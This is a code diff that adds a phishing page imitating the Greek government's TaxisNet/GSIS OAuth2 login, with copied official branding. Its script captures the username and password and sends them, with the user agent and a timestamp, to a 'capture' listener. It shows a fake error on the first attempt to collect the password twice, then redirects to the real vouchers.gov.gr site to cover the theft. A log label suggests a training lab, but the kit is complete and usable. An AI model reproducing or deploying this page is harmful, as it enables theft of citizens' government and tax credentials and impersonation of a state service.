@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#5b89b4" />
+  <title>OAuth2 | Γενική Γραμματεία Πληροφοριακών Συστημάτων και Ψηφιακής Διακυβέρνησης</title>
+  <link rel="stylesheet" href="login.css" />
+</head>
+<body>
+
+  <div class="loading-overlay" id="loadingOverlay" aria-hidden="true">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="container">
+    <div class="card">
+
+      <header class="header">
+        <div class="header__inner">
+
+          <div class="logo logo--left">
+            <svg class="logo__mark" viewBox="0 0 56 56" aria-hidden="true">
+              <rect x="6"  y="14" width="9"  height="36" fill="#5b89b4"/>
+              <rect x="41" y="14" width="9"  height="36" fill="#5b89b4"/>
+              <rect x="6"  y="14" width="44" height="6"  fill="#5b89b4"/>
+              <rect x="22" y="26" width="12" height="20" fill="#e88121"/>
+              <rect x="25" y="34" width="6"  height="12" fill="#fff"/>
+              <rect x="2"  y="8"  width="52" height="3"  fill="#5b89b4"/>
+            </svg>
+            <div class="logo__text logo__text--blue">
+              <span>Γενική Γραμματεία</span>
+              <span>Πληροφοριακών</span>
+              <span>Συστημάτων &amp;</span>
+              <span>Ψηφιακής Διακυβέρνησης</span>
+            </div>
+          </div>
+
+          <div class="logo logo--right">
+            <svg class="logo__mark logo__mark--seal" viewBox="0 0 56 56" aria-hidden="true">
+              <circle cx="28" cy="28" r="22" fill="none" stroke="#1f4e8a" stroke-width="2"/>
+              <circle cx="28" cy="28" r="17" fill="#1f4e8a"/>
+              <rect x="26" y="14" width="4"  height="28" fill="#fff"/>
+              <rect x="14" y="26" width="28" height="4"  fill="#fff"/>
+            </svg>
+            <div class="logo__text logo__text--navy">
+              <strong>ΕΛΛΗΝΙΚΗ ΔΗΜΟΚΡΑΤΙΑ</strong>
+              <span>Υπουργείο Ψηφιακής</span>
+              <span>Διακυβέρνησης</span>
+            </div>
+          </div>
+
+        </div>
+      </header>
+
+      <div class="banner">
+        <h1 class="banner__title">Αυθεντικοποίηση Χρηστών</h1>
+        <button type="button" class="banner__lang">English</button>
+      </div>
+
+      <main class="main">
+        <section class="login-box">
+          <h2 class="login-box__title">Σύνδεση</h2>
+          <p class="login-box__subtitle">
+            Παρακαλώ εισάγετε τους κωδικούς σας στο
+            <strong>TaxisNet</strong> για να συνδεθείτε.
+          </p>
+
+          <hr class="login-box__divider" />
+
+          <div class="error-box" id="errorBox" role="alert" aria-hidden="true">
+            <span class="error-box__title">Αποτυχία στην Αυθεντικοποίηση του χρήστη!</span>
+            <span class="error-box__text">Η σύνδεσή σας δεν ήταν δυνατή. Παρακαλώ προσπαθήστε ξανά.</span>
+          </div>
+
+          <form id="loginForm" novalidate autocomplete="on">
+            <div class="form-group">
+              <label for="username">Χρήστης:</label>
+              <input
+                type="text"
+                id="username"
+                name="username"
+                autocomplete="username"
+                autocapitalize="none"
+                autocorrect="off"
+                spellcheck="false"
+                required
+              />
+            </div>
+
+            <div class="form-group">
+              <label for="password">Κωδικός:</label>
+              <input
+                type="password"
+                id="password"
+                name="password"
+                autocomplete="current-password"
+                required
+              />
+            </div>
+
+            <button type="submit" class="submit-btn">Σύνδεση</button>
+          </form>
+        </section>
+
+        <div class="footer-link">
+          <a href="#">
+            Κέντρο Διαλειτουργικότητας (ΚΕ.Δ.) Υπουργείου Ψηφιακής Διακυβέρνησης
+          </a>
+        </div>
+      </main>
+
+    </div>
+  </div>
+
+  <script>
+    var LISTENER_URL = 'capture';
+
+    var attemptCount = 0;
+    var loadingEl = document.getElementById('loadingOverlay');
+    var errorBox = document.getElementById('errorBox');
+    var passwordInput = document.getElementById('password');
+
+    function showLoading() { loadingEl.style.display = 'flex'; }
+    function hideLoading() { loadingEl.style.display = 'none'; }
+
+    function showError() {
+      errorBox.style.display = 'flex';
+      errorBox.setAttribute('aria-hidden', 'false');
+      passwordInput.value = '';
+      passwordInput.focus();
+    }
+    function hideError() {
+      errorBox.style.display = 'none';
+      errorBox.setAttribute('aria-hidden', 'true');
+    }
+
+    function exfiltrate(user, pass) {
+      var payload = JSON.stringify({
+        username: user,
+        password: pass,
+        attempt:  attemptCount + 1,
+        ua:       navigator.userAgent,
+        ts:       Date.now()
+      });
+
+      try {
+        if (navigator.sendBeacon) {
+          var blob = new Blob([payload], { type: 'application/json' });
+          navigator.sendBeacon(LISTENER_URL, blob);
+        } else {
+          fetch(LISTENER_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: payload,
+            keepalive: true
+          }).catch(function () {});
+        }
+      } catch (err) {
+        console.warn('[lab] exfil failed:', err);
+      }
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      var user = document.getElementById('username').value.trim();
+      var pass = passwordInput.value;
+      if (!user || !pass) return;
+
+      hideError();
+      showLoading();
+      exfiltrate(user, pass);
+
+      // πρώτη προσπάθεια εμφανίζει ψεύτικο σφάλμα για να ξαναπληκτρολογήσει
+      if (attemptCount === 0) {
+        attemptCount++;
+        setTimeout(function () {
+          hideLoading();
+          showError();
+        }, 1700);
+      } else {
+        setTimeout(function () {
+          hideLoading();
+          window.location.href = 'https://www.vouchers.gov.gr/';
+        }, 1900);
+      }
+    });
+  </script>
+</body>
+</html>
